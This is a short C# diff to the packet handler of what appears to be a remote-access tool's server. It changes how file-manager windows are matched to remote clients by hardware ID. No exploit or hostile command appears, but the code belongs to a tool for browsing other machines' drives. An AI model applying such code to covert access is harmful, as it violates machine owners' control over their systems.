@@ -22,9 +22,24 @@ namespace Server.Handle_Packet
             {
                 switch (unpack_msgpack.ForcePathObject("Command").AsString)
                 {
+
+                    case "setClient":
+                        {
+                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
+                            if (FM != null)
+                            {
+                                if (FM.Client == null)
+                                {
+                                    client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
+                                    FM.Client = client;
+                                    FM.timer1.Enabled = true;
+                                }
+                            }
+                               break;
+                        }
                     case "getDrivers":
                         {
-                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
+                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                             if (FM != null)
                             {
                                 FM.toolStripStatusLabel1.Text = "";
@@ -50,7 +65,7 @@ namespace Server.Handle_Packet
 
                     case "getPath":
                         {
-                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
+                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                             if (FM != null)
                             {
                                 FM.toolStripStatusLabel1.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
@@ -105,7 +120,7 @@ namespace Server.Handle_Packet
 
                     case "error":
                         {
-                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
+                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                             if (FM != null)
                             {
                                 FM.listView1.Enabled = true;
